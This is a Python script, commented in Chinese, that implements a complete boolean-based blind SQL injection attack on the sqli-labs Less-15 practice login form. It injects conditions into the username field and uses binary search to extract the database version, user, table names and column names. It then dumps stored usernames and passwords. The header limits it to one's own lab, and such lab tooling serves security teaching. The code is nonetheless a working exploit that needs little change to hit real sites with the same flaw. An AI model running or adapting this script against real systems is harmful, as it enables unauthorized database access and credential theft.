#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sqli-labs Less-15 盲注工具（教学 / 本地靶场自测专用）

只用于你自己搭建的靶场。别拿它去打别人的站。

用法：
    python blind_sqli.py
    python blind_sqli.py --url http://localhost:8081/Less-15/ --marker flag.jpg
    python blind_sqli.py --delay 0.5 --debug

设计说明（四步法）：
    1. 画地图：VERSION() / CURRENT_USER() / DATABASE()
    2. 找表   ：information_schema.tables
    3. 找列   ：information_schema.columns
    4. 取数据 ：目标表 LIMIT n,1
每一步都只返回一个值，这样才能塞进盲注的布尔判断里。
"""

import argparse
import sys
import time

import requests

# ---------------------------------------------------------------- 默认配置

DEFAULT_URL = "http://localhost:8081/Less-15/"
DEFAULT_MARKER = "flag.jpg"      # 登录成功后页面里出现的标志
PAYLOAD_PREFIX = "admin"         # Less-15 需要一个存在的用户名
PAYLOAD_SUFFIX = "' AND {cond} -- "   # 注意：-- 后面必须有一个空格


# ---------------------------------------------------------------- 常用表达式
# 这些是“返回单个值”的表达式，直接喂给 Injector.string() / length()。
# LIMIT {n},1 里的 {n} 是行号，从 0 开始。

EXPR = {
    # --- 第 0 步：画地图 ---
    "version":      "VERSION()",
    "current_user": "CURRENT_USER()",
    "session_user": "USER()",
    "database":     "DATABASE()",
    "datadir":      "@@datadir",
    "secure_file":  "@@secure_file_priv",

    # --- 第 1 步：有哪些表 ---
    "table": (
        "SELECT table_name FROM information_schema.tables "
        "WHERE table_schema=DATABASE() ORDER BY table_name LIMIT {n},1"
    ),

    # --- 第 2 步：某张表有哪些列 ---
    "column": (
        "SELECT column_name FROM information_schema.columns "
        "WHERE table_schema=DATABASE() AND table_name=0x{table_hex} "
        "ORDER BY ordinal_position LIMIT {n},1"
    ),

    # --- 第 3 步：取数据 ---
    "username": "SELECT username FROM users ORDER BY id LIMIT {n},1",
    "password": "SELECT password FROM users ORDER BY id LIMIT {n},1",

    # --- 一把梭：一次拿到全部 用户名:密码 ---
    "all_users": (
        "SELECT GROUP_CONCAT(username,0x3a,password) FROM users"
    ),
}


def to_hex(text: str) -> str:
    """把字符串转成 MySQL 的十六进制字面量，避开引号转义问题。"""
    return text.encode("utf-8").hex()


# ---------------------------------------------------------------- 注入器

class Injector:
    def __init__(self, url, marker, delay=0.2, retries=3, timeout=10):
        self.url = url
        self.marker = marker
        self.delay = delay
        self.retries = retries
        self.timeout = timeout
        self.session = requests.Session()
        self.session.trust_env = False      # 忽略系统代理，避免被本地代理截胡
        self.requests_made = 0

    # -- 底层请求 --------------------------------------------------

    def _post(self, cond: str):
        data = {
            "uname": PAYLOAD_PREFIX + PAYLOAD_SUFFIX.format(cond=cond),
            "passwd": "123456",
            "submit": "Submit",
        }
        self.requests_made += 1
        if self.delay:
            time.sleep(self.delay)
        return self.session.post(self.url, data=data, timeout=self.timeout)

    def is_true(self, cond: str) -> bool:
        """条件为真返回 True。

        网络抖动不能当成“假”，否则二分法会把字符判错还
        在不知不觉中把结果写进报告。所以失败就重试，
        重试仍失败直接抛异常，宁可中断也不要错数据。
        """
        last_error = None
        for attempt in range(1, self.retries + 1):
            try:
                resp = self._post(cond)
                return self.marker in resp.text
            except requests.RequestException as exc:      # 连接失败 / 超时
                last_error = exc
                time.sleep(0.5 * attempt)
        raise RuntimeError(f"请求连续失败 {self.retries} 次：{last_error}")

    # -- 二分法取长度 ----------------------------------------------

    def length(self, expr: str) -> int:
        low, high = 0, 128
        while low <= high:
            mid = (low + high) // 2
            if self.is_true(f"length(({expr}))>{mid}"):
                low = mid + 1
            else:
                high = mid - 1
        return low          # 循环结束时 low 就是真实长度

    # -- 二分法取字符串 --------------------------------------------

    def string(self, expr: str, verbose=True) -> str:
        total = self.length(expr)
        if total == 0:
            return ""
        chars = []
        for pos in range(1, total + 1):
            low, high = 32, 126
            while low <= high:
                mid = (low + high) // 2
                if self.is_true(f"ascii(substr(({expr}),{pos},1))>{mid}"):
                    low = mid + 1
                else:
                    high = mid - 1
            chars.append(chr(low))
            if verbose:
                print(f"    [*] {''.join(chars)}", end="\r", flush=True)
        if verbose:
            print()
        return "".join(chars)

    # -- 批量取行：一直取到空为止 ----------------------------------

    def rows(self, tpl: str, max_rows=50, label="") -> list:
        """tpl 里用 {n} 占位行号，返回所有非空结果。"""
        result = []
        for n in range(max_rows):
            expr = tpl.format(n=n)
            value = self.string(expr, verbose=False)
            if not value:
                break
            result.append(value)
            print(f"  [+] {label}[{n}] = {value}")
        return result


# ---------------------------------------------------------------- 主流程

def check(cond: str, label: str) -> bool:
    print(f"  [{'√' if cond else '×'}] {label}")
    return cond


def main() -> int:
    parser = argparse.ArgumentParser(description="sqli-labs Less-15 盲注工具")
    parser.add_argument("--url", default=DEFAULT_URL)
    parser.add_argument("--marker", default=DEFAULT_MARKER)
    parser.add_argument("--delay", type=float, default=0.2, help="每次请求间隔秒数")
    parser.add_argument("--no-dump", action="store_true", help="只测注入点，不取数据")
    args = parser.parse_args()

    inj = Injector(args.url, args.marker, delay=args.delay)

    print(f"[*] 目标   : {args.url}")
    print(f"[*] 成功标志: {args.marker}")
    print(f"[*] 请求间隔: {args.delay}s\n")

    # ---------------- 0. 冒烟测试 ----------------
    print("[0/4] 测试注入点")
    if not check(inj.is_true("1=1"), "条件为真 → 有成功标志"):
        print("\n[!] 注入点不通：检查靶场是否启动、marker 是否写对、admin 是否存在")
        return 1
    if check(inj.is_true("1=2"), "条件为假 → 无成功标志（应为 False）"):
        print("\n[!] 真假判断反了：你的判据不是布尔型的，得改用别的判定")
        return 1

    # ---------------- 1. 画地图 ----------------
    print("\n[1/4] 画地图")
    for key in ("version", "current_user", "database"):
        print(f"  [*] {key:<12} = {inj.string(EXPR[key])}")

    if args.no_dump:
        print(f"\n[*] 共发出 {inj.requests_made} 次请求")
        return 0

    # ---------------- 2. 找表 ----------------
    print("\n[2/4] 枚举当前库的表")
    tables = inj.rows(EXPR["table"], label="table")
    if not tables:
        print("  [!] 一张表都没取到，检查 information_schema 是否可用")
        return 1

    # ---------------- 3. 找列 ----------------
    print("\n[3/4] 枚举各表的列")
    column_map = {}
    for table in tables:
        print(f"  {table}:")
        tpl = EXPR["column"].replace("{table_hex}", to_hex(table))
        cols = inj.rows(tpl, label="column")
        column_map[table] = cols

    # ---------------- 4. 取数据 ----------------
    print("\n[4/4] 取用户表数据")
    if "users" not in column_map:
        print("  [!] 没找到 users 表，下面按不存在处理")
    else:
        print("  [*] 直接一把梭（GROUP_CONCAT）")
        print(f"      {inj.string(EXPR['all_users'])}")

        print("  [*] 逐行取 username / password")
        users = inj.rows(EXPR["username"], label="username")
        pwds = inj.rows(EXPR["password"], label="password")
        print("\n  [*] 配对结果：")
        for u, p in zip(users, pwds):
            print(f"      {u:<20} {p}")

    print(f"\n[*] 共发出 {inj.requests_made} 次请求")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] 已中断")
        sys.exit(130)
    except RuntimeError as exc:
        print(f"\n[!] {exc}")
        sys.exit(2)
